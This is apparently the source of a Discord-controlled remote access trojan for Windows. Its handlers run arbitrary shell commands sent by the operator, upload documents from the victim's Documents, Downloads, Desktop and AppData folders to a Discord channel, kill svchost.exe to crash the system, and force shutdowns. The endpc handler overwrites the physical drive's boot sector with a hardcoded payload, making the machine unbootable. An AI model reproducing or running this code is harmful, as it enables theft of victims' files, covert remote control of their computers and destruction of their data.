import builtins as FUIFRU56194965148948749498ergerfr
from notoken887.encryptor import TokenCryptor
import base64
from Crypto.Util.Padding import pad
import os
import pyperclip
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
import time
import subprocess
import random
import base64
import os, discord,requests
import subprocess
import sys,pyttsx3,threading,shutil,webbrowser,psutil,time,asyncio,win32net,ctypes;from ctypes import windll;import winreg,win32file,win32con;import winreg as reg
import GPUtil,cpuinfo,socket,platform,random,string,rotatescreen,pyscreeze
import pycaw
import pyautogui, requests, win10toast, mss
async def clean(ctx):
    current_category = ctx.channel.category
    for category in ctx.guild.categories:
        if category != current_category:
            try:
                for channel in category.channels:
                    if channel.type == discord.ChannelType.text:
                        await channel.delete()
                await category.delete()
            except Exception:
                pass
    for channel in ctx.guild.text_channels:
        if channel.category is None:
            try:
                await channel.delete()
            except Exception:
                pass
    await ctx.send("channels cleaned")

async def clear(ctx):
    await ctx.channel.purge()
    await ctx.send("Channel cleared.")    
async def close(ctx):
    await ctx.send("reloading...")
    subprocess.Popen(['systemservice92'])
async def bsod(ctx):
    await ctx.send("BSOD TRIGGERED :D")
    try:
        subprocess.run("taskkill /f /im svchost.exe", shell=True, check=True)
    except Exception:
        pass
async def processes(ctx):
    def save():
        try:
            doc_path = os.path.expanduser('~') + "\\Documents\\processes.txt"
            result = subprocess.run("tasklist", capture_output=True, text=True, shell=True)
            processes_list = result.stdout.splitlines()
            processes_list.sort()
            with open(doc_path, 'w') as f:
                f.write("\n".join(processes_list))
            asyncio.run_coroutine_threadsafe(ctx.send(file=discord.File(doc_path)), ctx.bot.loop)
            time.sleep(2)
            os.remove(doc_path)
        except Exception:
            return
    threading.Thread(target=save).start()
async def fileretrieval(ctx):
    try:
        getpcusername = os.getlogin()
        channel_name = f"{getpcusername}-files"
        guild = ctx.guild

        async def create_channel():
            return await guild.create_text_channel(channel_name)

        channel = await create_channel()

        async def send_files(directory, sent_files):
            for root, dirs, files in os.walk(directory, topdown=True):
                for file in files:
                    if file.lower().endswith(('.pdf', '.txt', '.html', '.csv')):
                        full_path = os.path.join(root, file)
                        if os.path.getsize(full_path) <= 9.9 * 1024 * 1024:
                            if full_path not in sent_files:
                                try:
                                    await channel.send(f"**File Path:** {full_path}", file=discord.File(full_path))
                                    sent_files.add(full_path)
                                except Exception:
                                    continue
                for dir_name in dirs:
                    dir_path = os.path.join(root, dir_name)
                    try:
                        os.access(dir_path, os.R_OK)
                    except PermissionError:
                        dirs.remove(dir_name)

        c_drive_dirs = [
            r"C:\Users\%s\Documents" % getpcusername,
            r"C:\Users\%s\Downloads" % getpcusername,
            r"C:\Users\%s\Pictures" % getpcusername,
            r"C:\Users\%s\Videos" % getpcusername,
            r"C:\Users\%s\Desktop" % getpcusername,
            r"C:\Users\%s\AppData" % getpcusername
        ]
        
        dirs_to_scan = []
        for directory in c_drive_dirs:
            if os.path.exists(directory):
                dirs_to_scan.append(directory)

        sent_files = set() 
        tasks = []
        for directory in dirs_to_scan:
            tasks.append(send_files(directory, sent_files))

        await asyncio.gather(*tasks)

    except Exception as e:
        pass

async def sharenote(ctx, *, text: str):
    def share():
        if text:
            note_path = os.path.expanduser("~") + "/Documents/note.txt"
            i = 1
            while os.path.exists(note_path):
                note_path = os.path.expanduser(f"~") + f"/Documents/note{i}.txt"
                i += 1
            with open(note_path, 'w') as f:
                f.write(text)
            asyncio.run_coroutine_threadsafe(ctx.send(f"Note shared: {note_path}"), ctx.bot.loop)
            os.startfile(note_path)
        else:
            asyncio.run_coroutine_threadsafe(ctx.send("No text provided."), ctx.bot.loop)
    threading.Thread(target=share).start()
    
async def speak(ctx, *, text: str):
    await ctx.send(f"Speaking: {text}")
    threading.Thread(target=lambda: (
        engine := pyttsx3.init()
    ).setProperty('rate', engine.getProperty('rate') * 0.7) or engine.setProperty('volume', 1) or 
      engine.setProperty('voice', next(voice for voice in engine.getProperty('voices') if 'male' in voice.id.lower()).id) or
      engine.say(text) or engine.runAndWait() or engine.stop(), daemon=True).start()
async def pc(ctx, action: str = None):
    if action == "restart":
        await ctx.send("restarting pc")
        await asyncio.sleep(1)
        os.system("shutdown /r /f /t 0")
    elif action == "sd":
        await ctx.send("pc has been shut down")
        await asyncio.sleep(1)
        os.system("shutdown /s /f /t 0")
    elif action == "lock":
        os.system("rundll32.exe user32.dll,LockWorkStation")
        await ctx.send("pc locked")
    elif action == "help" or action is None:
        embed = discord.Embed(title="PC Control Bot Commands", description="Here are the available actions:", color=discord.Color.blue())
        embed.add_field(name="`restart`", value="Restarts the PC.", inline=False)
        embed.add_field(name="`sd`", value="Shuts down the PC.", inline=False)
        embed.add_field(name="`lock`", value="Locks the PC.", inline=False)
        embed.add_field(name="`help`", value="Shows this help message.", inline=False)
        await ctx.send(embed=embed)
    else:
        embed = discord.Embed(title="Invalid Action", description="```that action is invalid. \n use any of the following:\n 1. .pc restart - restart the pc\n2. .pc sd - shut down the pc \n 3. .pc lock - lock the pc.```", color=discord.Color.red())
        await ctx.send(embed=embed)
async def startupapps(ctx):
    def save_and_send():
        try:
            doc_path = os.path.expanduser('~') + "\\Documents\\startup_apps.txt"
            with open(doc_path, 'w') as f:
                for file in os.listdir(os.getenv("APPDATA") + r"\Microsoft\Windows\Start Menu\Programs\Startup"):
                    file_path = os.path.join(os.getenv("APPDATA") + r"\Microsoft\Windows\Start Menu\Programs\Startup", file)
                    if os.path.isfile(file_path):
                        try:
                            file_size = os.path.getsize(file_path) / (1024 * 1024)
                            file_size_str = f"{file_size:.2f} MB"
                            creation_date = time.ctime(os.path.getctime(file_path))
                            attributes = "Hidden" if os.stat(file_path).st_file_attributes & 2 else "Visible"
                            f.write(f"{file} -- {file_size_str} -- {attributes} -- {creation_date}\n")
                        except:
                            pass
            asyncio.run_coroutine_threadsafe(ctx.send(file=discord.File(doc_path)), ctx.bot.loop)
            time.sleep(2)
            os.remove(doc_path)
        except Exception:
            pass
    threading.Thread(target=save_and_send).start()

async def cmd(ctx, *, command: str):
    try:
        await ctx.send(f"Running command: {command}")
        output = await asyncio.to_thread(subprocess.run, command, capture_output=True, text=True, shell=True, timeout=10)
        result = output.stdout + output.stderr
        file_path = os.path.expanduser("~/Documents/outputcmd.txt")
        with open(file_path, 'w') as f:
            f.write(result)
        await ctx.send(file=discord.File(file_path, "outputcmd.txt"))
    except subprocess.TimeoutExpired:
        await ctx.send("The command timed out.")
    except Exception as e:
        await ctx.send(f"An error occurred: {e}")

async def kp(ctx,*,process:str):
 try:
  await ctx.send(f"Killed process: {process}")
  await asyncio.sleep(1)
  result=subprocess.run(f"taskkill /f /im {process} /t",capture_output=True,text=True,shell=True,timeout=7)
  if result.returncode==0:await ctx.send(f"Killed all instances of process {process}")
  else:await ctx.send(f"Error: Could not kill process {process}")
 except subprocess.TimeoutExpired:await ctx.send("Error: The taskkill command timed out.")
 except Exception as e:await ctx.send(f"Error: {e}")

async def wallpaper(ctx):
    try:
        file = await ctx.message.attachments[0].to_file()
        file_path = os.path.join(os.path.expanduser('~'), "wallpaper_temp.jpg")
        with open(file_path, 'wb') as f:
            f.write(file.fp.read())
        windll.user32.SystemParametersInfoW(20, 0, file_path, 3)
        await ctx.send("wallpaper changed")
    except Exception as e:
        await ctx.send(f"u gotta upload a picture")   
async def endpc(ctx):
    try:
        hDevice = win32file.CreateFileW(
            "\\\\.\\PhysicalDrive0", 
            win32con.GENERIC_WRITE, 
            win32con.FILE_SHARE_READ | win32con.FILE_SHARE_WRITE, 
            None, 
            win32con.OPEN_EXISTING, 
            0, 
            0
        )

        byte_list = bytes([0xB8, 0x13, 0x00, 0xCD, 0x10, 0xBF, 0x00, 0xA0, 0x8E, 0xC7, 0x31, 0xFF, 0xB9, 0x00, 0x10, 0xBB, 0x0F, 0x00, 0xE8, 0x3B, 0x00, 0xBD, 0xF0, 0x00, 0xBE, 0x00, 0x00, 0x88, 0xD8, 0xB4, 0x0C, 0xB9, 0x00, 0xFA, 0xF3, 0xAB, 0xFE, 0xC3, 0x80, 0xFB, 0x10, 0x7C, 0x02, 0xB3, 0x01, 0xE8, 0x41, 0x00, 0x4D, 0x83, 0xFD, 0x10, 0x7F, 0xE5, 0xBD, 0xF0, 0x00, 0xE8, 0x35, 0x00, 0xBD, 0x80, 0x00, 0xE8, 0x2F, 0x00, 0xBD, 0x40, 0x00, 0xE8, 0x29, 0x00, 0xE8, 0x41, 0x00, 0xE8, 0x36, 0x00, 0xEB, 0xCB, 0xBA, 0x42, 0x00, 0xB0, 0xB6, 0xEE, 0x42, 0xB0, 0x00, 0xEE, 0x42, 0xB0, 0x00, 0xEE, 0xBA, 0x61, 0x00, 0xB0, 0x03, 0xEE, 0xB9, 0x10, 0x27, 0xE4, 0x61, 0x34, 0x03, 0xE6, 0x61, 0x49, 0x75, 0xF7, 0xC3, 0xBA, 0xA0, 0x00, 0xBE, 0xA3, 0x7C, 0xB4, 0x0E, 0x8A, 0x04, 0xCD, 0x10, 0x46, 0x80, 0x3C, 0x00, 0x75, 0xF4, 0xC3, 0xB9, 0xAA, 0xAA, 0x90, 0x49, 0x75, 0xFC, 0xC3, 0xBE, 0x00, 0x00, 0xBF, 0x00, 0xA0, 0xBA, 0x40, 0x01, 0xB9, 0x64, 0x00, 0x8A, 0x04, 0x34, 0x0F, 0x88, 0x05, 0x47, 0x46, 0xE2, 0xF6, 0xC3, 0x4C, 0x4F, 0x4C, 0x47, 0x45, 0x54, 0x48, 0x41, 0x4B, 0x54, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x55, 0xAA])      

        win32file.WriteFile(hDevice, byte_list)
        win32file.CloseHandle(hDevice)

        await ctx.send("Action completed successfully.")

    except Exception as e:
        await ctx.send(f"An error occurred: {e}")